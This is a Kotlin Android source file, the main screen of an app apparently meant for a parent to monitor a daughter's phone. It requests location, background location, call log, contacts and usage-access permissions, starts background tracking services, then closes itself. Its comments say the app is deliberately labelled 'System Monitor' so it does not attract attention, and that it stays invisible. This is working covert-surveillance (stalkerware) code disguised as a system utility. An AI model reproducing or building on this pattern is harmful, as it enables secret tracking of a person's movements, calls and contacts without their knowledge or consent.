package com.parentalguard.ui

import android.Manifest
import android.app.AppOpsManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.parentalguard.services.CallLogSyncService
import com.parentalguard.services.LocationTrackingService
import com.parentalguard.utils.AppConfig

/**
 * ============================================================
 * MainActivity.kt
 * Package: com.parentalguard.ui
 *
 * PURPOSE:
 *   This is the ONE visible screen of the app.
 *   It has a single, focused job:
 *     1. Check which permissions the app has
 *     2. Request any that are missing
 *     3. Check the special "Usage Access" permission separately
 *     4. Start the two background services
 *     5. Close itself (finish()) so the app stays invisible
 *
 *   The app is labeled "System Monitor" so it doesn't attract
 *   attention on the daughter's phone.
 *
 * FLOW:
 *   Open app
 *     → checkAndRequestPermissions()
 *       → [user grants permissions]
 *         → checkUsageStatsPermission()
 *           → [user enables usage access in settings]
 *             → startMonitoringServices()
 *               → finish()  (app closes, services keep running)
 * ============================================================
 */
class MainActivity : AppCompatActivity() {

    companion object {
        // Request code passed to requestPermissions().
        // Android returns this in onRequestPermissionsResult()
        // so we know which permission request was answered.
        private const val PERMISSION_REQUEST_CODE = 100

        /**
         * The full list of "dangerous" permissions the app needs.
         * "Dangerous" = permissions that show a dialog to the user.
         * Normal permissions (like INTERNET) are granted automatically.
         *
         * ACCESS_BACKGROUND_LOCATION is only added on Android 10+
         * because it didn't exist before that version.
         */
        private val REQUIRED_PERMISSIONS = buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_PHONE_STATE)

            // Background location requires a SEPARATE permission on Android 10+
            // It cannot be requested in the same dialog as other permissions.
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }.toTypedArray()
    }

    // ----------------------------------------------------------
    // LIFECYCLE
    // ----------------------------------------------------------

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // We don't call setContentView() because we don't need a UI.
        // The activity immediately jumps into permission checking.

        checkAndRequestPermissions()
    }

    // ----------------------------------------------------------
    // STEP 1: CHECK AND REQUEST RUNTIME PERMISSIONS
    // ----------------------------------------------------------

    /**
     * Filters the required permissions to find any that haven't
     * been granted yet, then asks the user to grant them.
     *
     * If all permissions are already granted (e.g. on re-launch),
     * it skips straight to the Usage Access check.
     */
    private fun checkAndRequestPermissions() {
        // Find permissions that are NOT yet granted
        val missing = REQUIRED_PERMISSIONS.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) !=
                    PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            // All runtime permissions already granted — move to next step
            checkUsageStatsPermission()
        } else {
            // Show the system permission dialog for all missing permissions
            ActivityCompat.requestPermissions(
                this,
                missing.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    // ----------------------------------------------------------
    // STEP 2: CHECK USAGE ACCESS (SPECIAL PERMISSION)
    // ----------------------------------------------------------

    /**
     * PACKAGE_USAGE_STATS cannot be requested via the normal
     * permission dialog. It requires the user to go into
     * Settings and manually flip a switch.
     *
     * This function checks whether it's already enabled.
     * If not, it shows a dialog explaining why and opens the
     * correct Settings screen.
     */
    private fun checkUsageStatsPermission() {
        val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager

        // Check if usage stats access is allowed for this app
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
        }

        if (mode != AppOpsManager.MODE_ALLOWED) {
            // Usage access is NOT granted — prompt the user
            AlertDialog.Builder(this)
                .setTitle("Enable Usage Access")
                .setMessage(
                    "To track app screen time, please enable " +
                    "Usage Access for this app in the next screen.\n\n" +
                    "Find 'System Monitor' in the list and turn it ON."
                )
                .setPositiveButton("Open Settings") { _, _ ->
                    // Open the Usage Access settings page directly
                    startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
                }
                .setNegativeButton("Skip") { _, _ ->
                    // User skipped — screen time won't work, but other
                    // features (location, calls) will still function
                    startMonitoringServices()
                }
                .setCancelable(false)  // Force a choice — don't allow back button
                .show()
        } else {
            // Usage access already granted — everything is ready
            startMonitoringServices()
        }
    }

    // ----------------------------------------------------------
    // STEP 3: START BACKGROUND SERVICES
    // ----------------------------------------------------------

    /**
     * Starts both background services and then closes the activity.
     *
     * The services will keep running in the background even after
     * this Activity closes. They show a persistent notification
     * (required by Android for "foreground services") so the OS
     * doesn't kill them when the screen turns off.
     */
    private fun startMonitoringServices() {
        // Start the GPS location tracking service
        startForegroundServiceCompat(Intent(this, LocationTrackingService::class.java))

        // Start the call log + screen time sync service
        startForegroundServiceCompat(Intent(this, CallLogSyncService::class.java))

        Toast.makeText(this, "Monitoring active", Toast.LENGTH_SHORT).show()

        // Close this Activity — the app disappears from view
        // but the services continue running in the background.
        finish()
    }

    /**
     * Helper that calls the correct method to start a foreground
     * service depending on the Android version.
     *
     * startForegroundService() is required on API 26+ (Android 8.0+).
     * On older versions, startService() is sufficient.
     */
    private fun startForegroundServiceCompat(intent: Intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    // ----------------------------------------------------------
    // PERMISSION RESULT CALLBACK
    // ----------------------------------------------------------

    /**
     * Called automatically by Android after the user responds
     * to the permission dialog shown in checkAndRequestPermissions().
     *
     * @param requestCode  The code we passed to requestPermissions()
     * @param permissions  The permissions that were asked about
     * @param grantResults PERMISSION_GRANTED or PERMISSION_DENIED for each
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode != PERMISSION_REQUEST_CODE) return

        val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

        if (allGranted) {
            // All permissions granted — proceed to usage access check
            checkUsageStatsPermission()
        } else {
            // One or more permissions were denied — show explanation
            // and offer to open the app's permission settings manually.
            AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage(
                    "Location and Call Log access are required for monitoring.\n\n" +
                    "Please grant all permissions in Settings to continue."
                )
                .setPositiveButton("Open Settings") { _, _ ->
                    // Open this app's system permission settings page
                    startActivity(
                        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                    )
                }
                .setNegativeButton("Exit") { _, _ ->
                    // Exit the app — it can't function without permissions
                    finish()
                }
                .setCancelable(false)
                .show()
        }
    }
}
